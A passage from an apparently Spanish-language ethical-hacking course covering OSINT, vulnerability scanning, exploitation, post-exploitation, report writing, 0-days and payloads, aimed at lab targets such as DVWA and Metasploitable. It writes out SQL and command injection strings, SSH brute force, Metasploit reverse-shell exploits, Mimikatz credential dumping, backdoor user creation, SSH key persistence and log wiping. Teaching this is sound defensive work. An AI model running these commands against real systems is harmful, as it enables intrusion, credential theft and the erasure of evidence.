sudo apt install python3-pip git -y
git clone https://github.com/smicallef/spiderfoot.git
cd spiderfoot
pip3 install -r requirements.txt

# Iniciar la interfaz web
python3 sf.py
```

Accede en tu navegador:
`http://localhost:5001`

---

### ✅ Ejemplo completo paso a paso: Recoger inteligencia de un dominio

---

#### 🎯 Escenario

Quieres investigar si el dominio `evilcorp.com` ha estado involucrado en amenazas.

---

#### 🔍 Paso 1: Buscar en VirusTotal

1. Ve a: [https://www.virustotal.com/gui/home/search](https://www.virustotal.com/gui/home/search)
2. Escribe: `evilcorp.com`
3. Verás:

   - Historial de análisis
   - Archivos relacionados
   - IPs o URLs conectadas

---

#### 🛠️ Paso 2: Usar TheHarvester

```bash
cd theHarvester
python3 theHarvester.py -d evilcorp.com -b bing,google,certspotter
```

🔎 Resultado esperado:

- Correos asociados
- Subdominios descubiertos
- Entradas de certificados SSL

---

#### 🌐 Paso 3: Buscar en Shodan

1. Ve a [https://www.shodan.io/](https://www.shodan.io/)
2. Escribe: `hostname:evilcorp.com`

Verás:

- Dispositivos expuestos (servidores, cámaras, routers)
- Puertos abiertos
- Software usado (¡y su versión!)

---

#### 📊 Paso 4: Correlacionar información

- Las IPs descubiertas pueden buscarse en listas negras
- Subdominios sospechosos pueden escanearse con Nmap
- Cualquier software desactualizado podría ser vulnerable

---

### 💡 Resultado Final

Con estos pasos podrías decir:

> "El dominio `evilcorp.com` tiene 4 subdominios, uno de ellos (`vpn.evilcorp.com`) usa un servidor con Apache 2.2 sin parchear, y su IP aparece en 2 listas negras según VirusTotal. Podría estar comprometido."

---

### 🧭 Resumen

| Concepto                | Explicación corta                                     |
| ----------------------- | ----------------------------------------------------- |
| ¿Qué es?                | Recoger info de amenazas (IPs, malware, actores)      |
| ¿Para qué sirve?        | Prevenir ataques y fortalecer la defensa              |
| ¿Qué herramientas usar? | TheHarvester, SpiderFoot, MISP, Shodan                |
| ¿Cómo empezar?          | Instala herramientas OSINT, consulta fuentes          |
| ¿Ejemplo práctico?      | Analizar un dominio sospechoso con VirusTotal + OSINT |

---

[🔼](#índice)

---

## **779. Análisis de Vulnerabilidades**

### 🧠 Definición sencilla:

El **análisis de vulnerabilidades** es el proceso de **buscar fallos de seguridad** (vulnerabilidades) en sistemas, redes, aplicaciones o dispositivos **antes de que sean explotados** por un atacante.

> Piensa en ello como una revisión médica de tu sistema: buscas “puntos débiles” para corregirlos antes de que causen problemas.

---

### 🎯 ¿Para qué sirve?

- ✅ Detectar configuraciones inseguras
- ✅ Encontrar software desactualizado
- ✅ Identificar puertos abiertos innecesarios
- ✅ Conocer riesgos antes de que un hacker los use

---

### 🔍 ¿Cómo se hace?

El proceso suele incluir:

1. **Identificación del objetivo**: IP, sitio web, red, aplicación.
2. **Escaneo automático** con herramientas.
3. **Análisis de los resultados** (falsos positivos, gravedad).
4. **Reporte** de vulnerabilidades encontradas.
5. **Remediación**: parches, actualizaciones o cambios de configuración.

---

### 🔧 Herramientas populares para Análisis de Vulnerabilidades

---

| Herramienta     | Tipo                                      | Descripción                      |
| --------------- | ----------------------------------------- | -------------------------------- |
| **Nessus**      | Comercial (con versión gratuita limitada) | Escáner profesional              |
| **OpenVAS**     | Gratuita, open source                     | Escaneo de red y puertos         |
| **Nmap + NSE**  | Gratuita                                  | Escaneo + scripts de detección   |
| **Nikto**       | Gratuita                                  | Escáner de vulnerabilidades web  |
| **ZAP (OWASP)** | Gratuita                                  | Escáner web y proxy para pruebas |

---

### 🧰 Instalación de herramientas (Linux)

---

### ✅ Ejemplo 1: Instalar **OpenVAS** (ahora llamado Greenbone)

#### En Kali Linux (ya viene instalado):

```bash
sudo gvm-setup
sudo gvm-check-setup
```

Después, accede vía navegador:

```
https://localhost:9392
```

Usuario por defecto: `admin` (contraseña generada en setup)

---

### ✅ Ejemplo 2: Instalar **Nikto**

```bash
sudo apt update
sudo apt install nikto -y
```

Ejecutar un escaneo:

```bash
nikto -h http://example.com
```

🔎 Esto escanea el sitio `example.com` buscando vulnerabilidades web conocidas.

---

### ✅ Ejemplo 3: Usar **Nmap con scripts NSE**

```bash
# Escaneo con scripts de seguridad
nmap -sV --script vuln 192.168.1.10
```

📋 Esto analiza la IP y detecta posibles vulnerabilidades en servicios.

---

### ✅ Ejemplo completo: Análisis de vulnerabilidades con Nikto + Nmap

---

#### 🎯 Objetivo: Analizar un sitio web vulnerable (por ejemplo, una app de práctica como DVWA)

#### Paso 1: Instalar DVWA en un entorno local (si no lo tienes)

```bash
# En Kali o Ubuntu con Apache y PHP
sudo apt install apache2 php mysql-server php-mysqli -y
git clone https://github.com/digininja/DVWA.git
sudo mv DVWA /var/www/html/dvwa
sudo chown -R www-data:www-data /var/www/html/dvwa
```

Activa DVWA en el navegador:
`http://localhost/dvwa`

---

#### Paso 2: Escanear con **Nikto**

```bash
nikto -h http://localhost/dvwa
```

📋 Resultado:

- Directorios inseguros (como `/phpinfo.php`)
- Versiones de Apache o PHP vulnerables
- Encabezados de seguridad faltantes (como `X-Frame-Options`)

---

#### Paso 3: Escanear con **Nmap + NSE**

```bash
nmap -sV --script vuln localhost
```

📋 Resultado:

- Te dirá si tienes versiones vulnerables de MySQL, Apache, SSH, etc.
- Usará scripts como `http-vuln-cve2017-5638`, `ftp-vsftpd-backdoor`, etc.

---

#### Paso 4: Analizar resultados

1. Verifica si son falsos positivos.
2. Consulta CVEs referenciados (en [https://cve.mitre.org](https://cve.mitre.org)).
3. Clasifica por severidad (puedes usar el sistema CVSS).
4. Elabora un reporte con:

   - Descripción de cada vulnerabilidad
   - Riesgo (bajo, medio, alto)
   - Recomendación (parchear, desactivar servicio, actualizar, etc.)

---

### 🧭 Resumen

| Concepto                   | Explicación                                  |
| -------------------------- | -------------------------------------------- |
| ¿Qué es el análisis?       | Buscar debilidades en un sistema             |
| ¿Qué herramientas se usan? | Nmap, Nikto, Nessus, OpenVAS, ZAP            |
| ¿Cómo se instala?          | Con apt, pip o desde repositorios            |
| ¿Qué entregas al final?    | Un reporte con vulnerabilidades + soluciones |
| ¿Quién lo necesita?        | Empresas, pentesters, sysadmins              |

---

### 📌 Extra: Clasificación de las vulnerabilidades encontradas

Puedes usar el sistema CVSS (Common Vulnerability Scoring System) para darles puntuación de severidad:

- **Bajo (0.1 - 3.9)**
- **Medio (4.0 - 6.9)**
- **Alto (7.0 - 8.9)**
- **Crítico (9.0 - 10)**

---

[🔼](#índice)

---

## **780. Técnicas de ataque y explotación de vulnerabilidades**

### 📌 Definición sencilla:

Las **técnicas de ataque** son **métodos que usan los atacantes** para comprometer un sistema, aplicación o red.

La **explotación** es la fase donde el atacante **aprovecha una vulnerabilidad específica** para tomar control, robar datos o ejecutar acciones no autorizadas.

---

### 🧠 ¿Cómo funciona un ataque típico?

1. **Reconocimiento:** Buscar información del objetivo (dominios, IPs, servicios).
2. **Escaneo de vulnerabilidades:** Identificar fallos (puertos abiertos, software obsoleto).
3. **Explotación:** Usar un exploit (herramienta/código) para aprovechar el fallo.
4. **Post-explotación:** Mantener acceso, escalar privilegios, moverse lateralmente.
5. **Exfiltración o persistencia:** Robar datos, instalar backdoors o rootkits.

---

### 🎯 Ejemplos fáciles de entender

---

#### 1. **Inyección SQL**

**Ataque:**

Modificar una consulta SQL desde un campo de login para acceder a la base de datos sin contraseña.

**Ejemplo:**

```sql
Usuario: admin' OR '1'='1
Contraseña: [vacía]
```

Esto puede devolver todos los usuarios si no se sanitiza la entrada.

---

#### 2. **Fuerza bruta**

**Ataque:**

Probar muchas contraseñas hasta encontrar la correcta.

**Ejemplo:**

Usar una herramienta como `Hydra` o `Burp Suite` para probar miles de combinaciones de usuario/contraseña.

---

#### 3. **RCE (Remote Code Execution)**

**Ataque:**

Enviar comandos al servidor que se ejecutan remotamente (por ejemplo, por un input vulnerable).

**Ejemplo de comando malicioso:**

```bash
http://victima.com/page?input=;ls -la
```

---

### 🛠️ Herramientas más usadas para explotación

---

| Herramienta      | Descripción                            |
| ---------------- | -------------------------------------- |
| **Metasploit**   | Framework de explotación más famoso    |
| **Searchsploit** | Búsqueda local de exploits conocidos   |
| **Exploit-DB**   | Base de datos pública de exploits      |
| **Burp Suite**   | Ataques web (inyección, fuzzing, etc.) |
| **Hydra**        | Ataques de fuerza bruta a servicios    |
| **sqlmap**       | Automatiza ataques de inyección SQL    |

---

### 🧰 ¿Cómo instalar herramientas de explotación?

---

#### ✅ Metasploit Framework (en Kali o Ubuntu)

```bash
sudo apt update
sudo apt install metasploit-framework -y
```

Verifica instalación:

```bash
msfconsole
```

---

#### ✅ sqlmap (para inyecciones SQL)

```bash
sudo apt install sqlmap -y
```

Ejecutar escaneo básico:

```bash
sqlmap -u "http://target.com/product?id=1" --dbs
```

---

#### ✅ Hydra (fuerza bruta)

```bash
sudo apt install hydra -y
```

Ejemplo: fuerza bruta contra SSH

```bash
hydra -l admin -P rockyou.txt ssh://192.168.1.10
```

---

### ✅ Ejemplo práctico completo: Explotación de una app vulnerable con Metasploit

---

#### 🧪 Escenario: Tienes un entorno de laboratorio con una máquina vulnerable (por ejemplo, **Metasploitable 2**) y una máquina atacante con **Kali Linux**.

---

#### Paso 1: Reconocimiento

Escaneas la máquina vulnerable con Nmap:

```bash
nmap -sV 192.168.1.100
```

Resultado: puerto 21 (FTP), 22 (SSH), 80 (HTTP), 139/445 (SMB)

---

#### Paso 2: Encontrar una vulnerabilidad

Buscas exploits para el servicio SMB (puerto 445):

```bash
searchsploit samba
```

Encuentras:

```
Samba 3.0.20 < 3.0.25rc3 - 'Username Map Script' Command Execution
```

---

#### Paso 3: Usar Metasploit para explotar

```bash
msfconsole
```

Dentro de Metasploit:

```bash
use exploit/multi/samba/usermap_script
set RHOST 192.168.1.100
set PAYLOAD cmd/unix/reverse
set LHOST 192.168.1.101  # Tu IP
run
```

🎉 ¡Explotado! Obtienes una **shell remota** en la máquina vulnerable.

---

#### Paso 4: Post-explotación

Ya dentro de la máquina:

```bash
whoami
ls -la
cat /etc/passwd
```

Puedes navegar por el sistema, leer archivos sensibles, etc.

---

### 🧾 Resumen

| Elemento                | Descripción clara                        |
| ----------------------- | ---------------------------------------- |
| ¿Qué es la explotación? | Aprovechar vulnerabilidades para atacar  |
| ¿Qué técnicas se usan?  | Inyección, RCE, fuerza bruta, LFI, etc.  |
| ¿Cómo se hace?          | Con herramientas como Metasploit, sqlmap |
| ¿Qué se necesita?       | Conocimiento, entorno de prueba, escaneo |
| ¿Qué pasa después?      | Post-explotación: leer, moverse, escalar |

---

### 🛡️ Recomendación final

- Usa **entornos de laboratorio**, como:

  - Metasploitable 2 o 3
  - DVWA (Damn Vulnerable Web App)
  - OWASP Juice Shop
  - VirtualBox + Kali Linux + vulnerable VM

- Nunca ataques sistemas sin autorización ❌

- Practica siempre en entornos controlados ✅

---

[🔼](#índice)

---

## **781. Post-explotación**

### 📌 Definición simple:

La **post-explotación** es la **fase que ocurre después de haber explotado una vulnerabilidad y obtener acceso al sistema objetivo**.

> Es como entrar por una ventana (explotación) y luego moverte dentro de la casa (post-explotación): ves qué puedes hacer, robas información, tomas control, creas persistencia, etc.

---

### 🛠️ ¿Qué actividades incluye?

1. **Enumeración interna**: Saber dónde estás, quién eres y qué hay.
2. **Escalamiento de privilegios**: Convertirte en administrador/root.
3. **Movimientos laterales**: Saltar a otros sistemas.
4. **Obtención de credenciales**: Buscar contraseñas o tokens.
5. **Persistencia**: Dejar puertas traseras o malware para volver luego.
6. **Limpieza de rastros**: Borrar logs para no ser detectado.

---

### 📚 Ejemplos fáciles de entender

---

#### 🔍 1. Enumeración interna

Después de acceder:

```bash
whoami           # Saber qué usuario eres
hostname         # Nombre del sistema
ip a             # Ver IPs asignadas
```

---

#### 🧠 2. Escalar privilegios (Privilege Escalation)

Si tienes acceso como usuario limitado, puedes buscar formas de hacerte root:

```bash
sudo -l          # Ver qué comandos puedes ejecutar con sudo
find / -perm -u=s -type f 2>/dev/null
```

O usar herramientas como **LinPEAS** para automatizarlo.

---

#### 🔓 3. Obtener contraseñas

Buscar archivos con contraseñas:

```bash
cat /etc/passwd
cat ~/.bash_history
```

O acceder a bases de datos con configuraciones débiles.

---

#### 🔄 4. Movimientos laterales

Usar contraseñas o sesiones capturadas para moverse a otros servidores en la misma red.

---

#### 🔁 5. Persistencia

Crear un usuario nuevo para volver luego:

```bash
sudo useradd hacker -m -s /bin/bash
sudo passwd hacker
```

---

#### 🧹 6. Limpieza de logs

```bash
rm -f ~/.bash_history
echo > /var/log/auth.log
```

⚠️ **Esto puede dejar rastros también. Hay formas más limpias si se desea evadir detección.**

---

### 🛠️ Herramientas para post-explotación

---

| Herramienta           | Para qué sirve                               |
| --------------------- | -------------------------------------------- |
| **Metasploit**        | Tiene módulos automáticos de post-exploit    |
| **Mimikatz**          | Extraer contraseñas en Windows               |
| **Empire**            | Post-explotación en PowerShell               |
| **LinPEAS / WinPEAS** | Enumeración de sistema y privilegios         |
| **BloodHound**        | Análisis de redes Windows (Active Directory) |
| **SSH / Netcat**      | Establecer shells persistentes               |

---

### 📥 ¿Cómo se instalan?

---

#### ✅ LinPEAS

Descarga desde GitHub:

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

---

#### ✅ Mimikatz (en Windows)

Descarga desde:

```
https://github.com/gentilkiwi/mimikatz
```

Ejemplo de uso (en consola de Windows):

```bash
privilege::debug
log
sekurlsa::logonpasswords
```

---

#### ✅ Metasploit Post Exploitation (ya integrado)

En `msfconsole`:

```bash
use post/linux/gather/enum_network
set SESSION 1
run
```

---

### ✅ Ejemplo completo de post-explotación con Metasploit

---

#### 🎯 Escenario:

- Ya has explotado una máquina Linux con **Metasploit**.
- Tienes una **shell reversa** abierta.
- Quieres hacer post-explotación.

---

#### Paso 1: Verifica la sesión

```bash
sessions
```

Respuesta:

```
[*] Active sessions
  Id  Name  Type            Information  Connection
  1         shell linux                  192.168.1.100 -> 192.168.1.101
```

---

#### Paso 2: Ejecuta post-exploit

```bash
use post/linux/gather/enum_users_history
set SESSION 1
run
```

Esto lista el historial de comandos de todos los usuarios.

---

#### Paso 3: Enumeración del sistema

```bash
use post/linux/gather/enum_system
set SESSION 1
run
```

Te dice:

- Distribución Linux
- Kernel
- Arquitectura
- Uptime

---

#### Paso 4: Buscar contraseñas

En shell remota:

```bash
cat /etc/shadow         # Si tienes root
grep -r 'password' /etc
```

---

#### Paso 5: Crear acceso persistente

```bash
use post/linux/manage/sshkey_persistence
set SESSION 1
set USERNAME root
set SSH_KEY /root/.ssh/id_rsa.pub
run
```

Ahora puedes volver a entrar por SSH.

---

#### Paso 6: Borrar rastros

```bash
echo '' > ~/.bash_history
rm -f /var/log/auth.log
```

---

### 🧾 Resumen

---

| Acción                  | Explicación clara                         |
| ----------------------- | ----------------------------------------- |
| ¿Qué es post-explotar?  | Aprovechar el acceso ya obtenido          |
| ¿Qué puedes hacer?      | Leer datos, moverte, robar contraseñas    |
| ¿Qué herramientas usar? | Metasploit, Mimikatz, LinPEAS, BloodHound |
| ¿Dónde hacerlo?         | En máquinas vulnerables de laboratorio    |
| ¿Qué debes evitar?      | Nunca hacerlo sin autorización legal      |

---

### 🎓 Conclusión

La post-explotación es **clave en el hacking ético y pruebas de penetración**. No basta con "entrar", hay que saber **qué hacer después** y cómo **protegerse de quienes lo hacen maliciosamente**.

---

[🔼](#índice)

---

## **782. Desarrollo de informes**

### 📌 Definición:

El **desarrollo de informes** en ciberseguridad es el proceso de **documentar los hallazgos de seguridad** obtenidos durante una auditoría, análisis de vulnerabilidades, pruebas de penetración o revisión de seguridad.

El informe es el **producto final** que entregas a tu cliente, empresa o profesor, y **debe ser claro, profesional y útil** para mejorar la seguridad del sistema evaluado.

---

### 🎯 ¿Para qué sirve?

- Comunicar las **vulnerabilidades encontradas**.
- Mostrar el **impacto real** de cada falla.
- Proveer **recomendaciones de remediación**.
- Servir como **evidencia técnica**.
- Ayudar en la **toma de decisiones** de seguridad.

---

### 🧱 Estructura típica de un informe de ciberseguridad

---

| Sección                | Contenido                                                   |
| ---------------------- | ----------------------------------------------------------- |
| 1. Portada             | Nombre del informe, fecha, autor, cliente                   |
| 2. Resumen ejecutivo   | Explicación clara y corta para directivos (sin tecnicismos) |
| 3. Alcance del trabajo | Qué sistemas, redes o apps se analizaron                    |
| 4. Metodología         | Técnicas usadas (OWASP, PTES, NIST, etc.)                   |
| 5. Hallazgos técnicos  | Descripción detallada de las vulnerabilidades encontradas   |
| 6. Evidencias          | Capturas de pantalla, comandos, resultados de herramientas  |
| 7. Recomendaciones     | Soluciones específicas para cada hallazgo                   |
| 8. Conclusión          | Estado general de la seguridad del sistema                  |
| 9. Glosario / anexos   | Términos técnicos o información adicional                   |

---

### 🧰 Herramientas útiles para hacer informes

---

| Herramienta             | Descripción                                     | Instalación                                                      |
| ----------------------- | ----------------------------------------------- | ---------------------------------------------------------------- |
| **CherryTree**          | Bloc de notas jerárquico para pentesters        | `sudo apt install cherrytree`                                    |
| **Dradis CE**           | Framework colaborativo de informes técnicos     | Desde [https://dradisframework.com](https://dradisframework.com) |
| **KeepNote**            | Tomador de notas multiplataforma                | `sudo apt install keepnote`                                      |
| **LaTeX**               | Ideal para informes profesionales y PDF limpios | `sudo apt install texlive-full`                                  |
| **LibreOffice**         | Procesador de texto (alternativa a Word)        | `sudo apt install libreoffice`                                   |
| **Markdown + Obsidian** | Informes rápidos con estilo técnico             | [https://obsidian.md](https://obsidian.md)                       |

También puedes usar **plantillas en Word o Google Docs** si estás empezando.

---

### ✅ Ejemplo completo de informe de ciberseguridad

---

#### 📝 Informe de Pruebas de Penetración

**Cliente:** Acme Corp
**Autor:** Juan Pérez
**Fecha:** 25 de julio de 2025

---

#### 1. Resumen Ejecutivo

Se realizó una prueba de penetración sobre el servidor web de Acme Corp. Se detectaron 3 vulnerabilidades de riesgo **alto**, 2 de riesgo **medio** y 1 de riesgo **bajo**. La más crítica permite ejecutar código remoto en el servidor.

---

#### 2. Alcance

- Dominio: `www.acme-corp.com`
- IP pública: `45.76.123.10`
- Duración: 3 días (del 22 al 24 de julio)

---

#### 3. Metodología

Se siguieron las etapas de OWASP y PTES:

- Reconocimiento pasivo y activo
- Enumeración de servicios
- Análisis de vulnerabilidades
- Explotación controlada
- Post-explotación básica
- Reporte técnico

Herramientas usadas: `nmap`, `gobuster`, `nikto`, `sqlmap`, `metasploit`, `Burp Suite`.

---

#### 4. Hallazgos Técnicos

##### Hallazgo 1: SQL Injection en `/login.php`

- **Riesgo:** Alto
- **Descripción:** El campo de usuario permite inyección de código SQL.
- **Evidencia:**
  Parámetro vulnerable: `username=admin' OR 1=1 --`
  Se accedió sin credenciales.

```bash
sqlmap -u "http://www.acme-corp.com/login.php" --data="user=admin&pass=123" --dbs
```

- **Impacto:** Acceso total a la base de datos.
- **Recomendación:** Usar sentencias preparadas y validación de entradas.

---

##### Hallazgo 2: Servidor con Apache 2.2 obsoleto

- **Riesgo:** Medio
- **Descripción:** El servidor web usa una versión vulnerable de Apache.
- **Evidencia:**

```bash
nmap -sV www.acme-corp.com
80/tcp open http Apache httpd 2.2.14 (Win32)
```

- **Impacto:** Puede permitir ejecución de código remoto (CVE-2010-2861).
- **Recomendación:** Actualizar a Apache 2.4 o superior.

---

#### 5. Recomendaciones Generales

- Implementar un WAF (Firewall de Aplicaciones Web).
- Forzar HTTPS y políticas de seguridad en cabeceras HTTP.
- Capacitar al equipo en desarrollo seguro (OWASP).
- Automatizar escaneo con herramientas como Nessus o OpenVAS.

---

#### 6. Conclusión

El sistema analizado presenta varias debilidades críticas que podrían ser aprovechadas por atacantes remotos. Se recomienda remediar las vulnerabilidades encontradas y realizar pruebas periódicas de seguridad.

---

#### 7. Anexos

- Capturas de pantalla de cada hallazgo
- Archivos de reporte Nmap y sqlmap
- Scripts utilizados
- Glosario de términos técnicos

---

### 🧠 Consejos útiles para informes

---

- ✅ Usa lenguaje claro, sin jerga innecesaria.
- ✅ Acompaña cada hallazgo con **evidencia y riesgo**.
- ✅ Prioriza con base en el **CVSS** o la clasificación de OWASP.
- ✅ Revisa ortografía y formato.
- ✅ Usa numeración y tablas para organizar bien.
- ✅ Entrega tanto versión **PDF** como editable (.docx/.odt).

---

### 📦 Plantillas listas para usar

- OWASP [reporte template PDF y Word](https://owasp.org/www-project-vulnerability-reporting/)
- GitHub: Busca repos con "Pentest Report Template"
- Offensive Security y Hack The Box también tienen ejemplos.

---

### 🎓 Conclusión

El desarrollo de informes no es solo un trámite, sino la **parte más importante del trabajo profesional en ciberseguridad**. Si no sabes comunicar tus hallazgos de forma clara y ordenada, el trabajo pierde impacto.

---

[🔼](#índice)

---

## **783. Vulnerabilidades de tipo 0-day**

### 🧠 Definición sencilla:

Una **vulnerabilidad 0-day** (pronunciado "zero day") es una **falla de seguridad desconocida por el fabricante del software** y, por lo tanto, aún **no tiene un parche o solución oficial**.

> Se llama "0-day" porque el desarrollador ha tenido **0 días** para solucionarla desde que se descubrió.

---

### 📌 ¿Por qué es peligrosa?

- **Los atacantes pueden explotarla sin ser detectados.**
- **No hay solución oficial aún.**
- Puede venderse en el **mercado negro (dark web)** por miles o millones de dólares.
- Se usa en **ciberespionaje**, **ciberguerra** y ataques dirigidos de alto nivel.

---

### 🎯 Ejemplo simple para entenderlo

---

Imagina que una empresa descubre que en su software de videollamadas, alguien puede mandar un archivo malicioso que permite espiar las llamadas **sin que nadie lo sepa**. El atacante descubre esto antes que el equipo de desarrollo.

- ⚠️ Nadie lo ha reportado.
- 📅 No existe parche.
- 🛡️ El antivirus no lo detecta porque **es nuevo**.

Eso es un **0-day**: una vulnerabilidad secreta **activa**, y que puede ser **explotada antes de que el mundo lo sepa**.

---

### 🔍 ¿Cómo se descubren los 0-day?

1. **Investigadores de seguridad** analizan código, software, binarios, etc.
2. **Hackers maliciosos** (black hat) prueban ataques hasta que algo falla.
3. A veces son encontrados por **casualidad** en pentesting.
4. También por **inteligencia artificial** o fuzzers (pruebas aleatorias automáticas).

---

### ⚙️ Herramientas para buscar / analizar 0-days

Estas herramientas NO crean vulnerabilidades 0-day, pero ayudan a buscar comportamientos raros que podrían ser vulnerabilidades desconocidas:

| Herramienta         | Descripción                                   | Instalación (Linux/Kali)                           |
| ------------------- | --------------------------------------------- | -------------------------------------------------- |
| **Fuzzing tools**   | Envían datos aleatorios para provocar fallos  | Ej: `afl`, `boofuzz`, `Peach`                      |
| **Ghidra**          | Ingeniería inversa de binarios                | [https://ghidra-sre.org/](https://ghidra-sre.org/) |
| **Radare2**         | Análisis de binarios, reversa                 | `sudo apt install radare2`                         |
| **Cutter**          | GUI para Radare2                              | [https://cutter.re](https://cutter.re)             |
| **Burp Suite Pro**  | Fuzzing web y análisis automatizado           | `burpsuite` en Kali Linux                          |
| **Metasploit**      | Aunque no tiene 0-days, permite usar exploits | `sudo apt install metasploit-framework`            |
| **Shodan / Censys** | Buscan sistemas vulnerables públicamente      | [https://shodan.io](https://shodan.io)             |

---

### 📥 Instalación de herramientas clave

#### 🧪 Instalar `boofuzz` para fuzzing web/API

```bash
sudo apt update
sudo apt install python3-pip
pip3 install boofuzz
```

#### 🧪 Instalar `afl` (American Fuzzy Lop)

```bash
sudo apt install afl
```

#### 🧪 Instalar `Ghidra` (ingeniería inversa)

1. Ve a: [https://ghidra-sre.org](https://ghidra-sre.org)
2. Descarga y descomprime.
3. Ejecuta: `./ghidraRun`

---

### ⚠️ ¿Cómo se usan los 0-day?

---

#### En el mundo real:

- **Ataques estatales**: como el malware Stuxnet (explotó múltiples 0-days para atacar sistemas industriales iraníes).
- **Cibercriminales**: para robar millones antes de que se detecte la falla.
- **Espías**: para vigilar sin ser detectados (NSO Pegasus).

---

### 🧪 Ejemplo completo (simulado)

> Este ejemplo **no explota un 0-day real**, sino que **simula** cómo se ve un hallazgo 0-day en una app vulnerable.

---

#### 🔧 Escenario:

Usamos la aplicación vulnerable **DVWA** (Damn Vulnerable Web App) para probar fuzzing. Imagina que el siguiente bug aún **no está documentado**, por lo que simula un 0-day.

---

#### Paso 1: Instala DVWA

```bash
sudo apt install apache2 php php-mysqli mysql-server git
git clone https://github.com/digininja/DVWA.git /var/www/html/dvwa
sudo chown -R www-data:www-data /var/www/html/dvwa
```

Activa en el navegador: [http://localhost/dvwa](http://localhost/dvwa)

---

#### Paso 2: Hacemos fuzzing con Boofuzz (simulado)

```python
# archivo: dvwa_fuzzer.py
from boofuzz import *

session = Session(
    target=Target(connection=SocketConnection("127.0.0.1", 80, proto='tcp'))
)

s_initialize("DVWA_Fuzz")
s_string("GET /dvwa/vulnerablepage.php?input=")
s_string("FUZZME", fuzzable=True)
s_string(" HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n")

session.connect(s_get("DVWA_Fuzz"))
session.fuzz()
```

Esto empieza a enviar cientos de cadenas raras al parámetro `input`.

---

#### Paso 3: Detectas un **comportamiento extraño**

- Una de las cadenas enviadas causa que el servidor **devuelva error 500** o incluso **ejectue un comando del sistema**.
- Aún **no existe reporte** sobre eso en la web.

🚨 Eso es potencialmente un **0-day**.

---

#### Paso 4: Documentas el hallazgo

```md
# 0-day descubierto en DVWA

Fecha: 25/07/2025
Autor: Juan Hacker

**Resumen:** Se encontró un bug en `vulnerablepage.php` que permite ejecutar comandos mediante el parámetro `input`.

**Reproducción:**
GET /dvwa/vulnerablepage.php?input=;whoami

**Resultado esperado:**

- Muestra usuario actual del sistema.

**Estado del hallazgo:** Sin CVE, sin parche oficial.

**Recomendación:** Filtrar caracteres especiales en `input`, validar datos del usuario.
```

---

### 🧠 ¿Cómo protegerse de 0-days?

---

Ya que **no puedes parchear algo que no conoces**, las defensas deben ser **profundas y múltiples**:

| Defensa                            | Descripción                                           |
| ---------------------------------- | ----------------------------------------------------- |
| ✅ WAF (Web Application Firewall)  | Bloquea patrones raros de ataques                     |
| ✅ Control de comportamiento       | Detecta acciones extrañas del software                |
| ✅ Red Team / Pentesting frecuente | Simula ataques para descubrir fallos internos         |
| ✅ Segmentación de red             | Aísla zonas sensibles (por si explotan algo)          |
| ✅ Actualizaciones constantes      | A veces un 0-day se convierte en 1-day si lo reportan |

---

### 🎓 Conclusión

Una **vulnerabilidad 0-day** es una de las amenazas más críticas en ciberseguridad. Aunque son difíciles de detectar, puedes:

- Simular su descubrimiento con fuzzers.
- Analizar software con ingeniería inversa.
- Implementar buenas prácticas defensivas para **reducir el impacto** si ocurre.

---

[🔼](#índice)

---

## **784. ¿Qué son los exploits y los payloads?**

### ✅ Definición simple:

Un **exploit** es un **fragmento de código o técnica** que aprovecha una **vulnerabilidad** en un sistema para lograr un comportamiento no deseado por el usuario o administrador.

> Es como usar una ganzúa para abrir una cerradura rota: el fallo (vulnerabilidad) existe, y tú (con el exploit) lo aprovechas.

---

### 🔓 ¿Qué puede hacer un exploit?

- Obtener acceso no autorizado
- Ejecutar código en la máquina víctima
- Robar datos
- Subir privilegios
- Caer el sistema (DoS)

---

### 💣 ¿Qué es un _Payload_?

---

#### ✅ Definición simple:

Un **payload** es el "código útil" que se **ejecuta después de que un exploit tiene éxito**. Es el resultado de haber entrado.

> Siguiendo el ejemplo anterior: el exploit abre la puerta, y el payload es lo que haces al entrar (tomar el control, instalar algo, abrir una consola, etc.).

---

#### 🔧 Tipos de payloads comunes

| Payload              | Qué hace                                      |
| -------------------- | --------------------------------------------- |
| `reverse shell`      | La víctima se conecta al atacante             |
| `bind shell`         | El atacante se conecta a la víctima           |
| `meterpreter shell`  | Shell avanzada de Metasploit                  |
| `download & execute` | Descarga y ejecuta un archivo                 |
| `add user`           | Agrega un usuario en el sistema de la víctima |

---

### 🔧 ¿Cómo se instalan herramientas para exploits y payloads?

La más común es:

#### ✅ **Metasploit Framework** (Exploit + Payloads + Post-Exploitation)

##### 🔹 En Kali Linux (ya viene preinstalado):

```bash
msfconsole
```

##### 🔹 En Debian/Ubuntu:

```bash
sudo apt update
sudo apt install metasploit-framework
```

##### 🔹 Verificar instalación:

```bash
msfconsole --version
```

---

### 🧪 Ejemplo real: Exploit + Payload con Metasploit

---

#### 🎯 Escenario:

Queremos explotar una vulnerabilidad en una app web vulnerable (`DVWA`) y obtener acceso con un **payload tipo reverse shell**.

---

#### Paso 1: Inicia Metasploit

```bash
msfconsole
```

---

#### Paso 2: Buscar un exploit

Ejemplo: Apache Struts exploit (uno conocido)

```bash
search struts
```

O para probar en local:

```bash
use exploit/unix/webapp/phpmyadmin/pmakey_exec
```

---

#### Paso 3: Seleccionar un payload

```bash
set PAYLOAD php/meterpreter/reverse_tcp
```

---

#### Paso 4: Configurar opciones

```bash
set RHOST 192.168.1.101       # IP de la víctima
set LHOST 192.168.1.100       # Tu IP atacante
set LPORT 4444                # Puerto para recibir conexión
```

---

#### Paso 5: Ejecutar el exploit

```bash
exploit
```

Si tiene éxito, verás:

```
[*] Sending exploit...
[*] Meterpreter session 1 opened
```

---

#### Paso 6: Usar el payload (meterpreter)

```bash
sessions
sessions -i 1
```

Dentro de la sesión puedes:

```bash
sysinfo            # Ver información del sistema
getuid             # Ver quién eres
shell              # Obtener una shell real
```

---

#### Paso 7: Limpieza y salida

```bash
exit
```

---

### 🧾 Resumen visual

```
          [ VULNERABILIDAD ]
               ↓
         [ EXPLOIT ] (aprovecha la falla)
               ↓
         [ PAYLOAD ] (toma control)
               ↓
        [ POST-EXPLOITACIÓN ]
```

---

### 🛑 Advertencia ética

> Usar exploits y payloads **solo está permitido con autorización** (entornos de laboratorio, pruebas de penetración legales). Hacerlo sin permiso es **ilegal y penado** por la ley.

---

### 🧠 Conclusión

| Concepto          | Significado Fácil                                    |
| ----------------- | ---------------------------------------------------- |
| Exploit           | Código que **aprovecha** una vulnerabilidad          |
| Payload           | Código que **se ejecuta** cuando el exploit funciona |
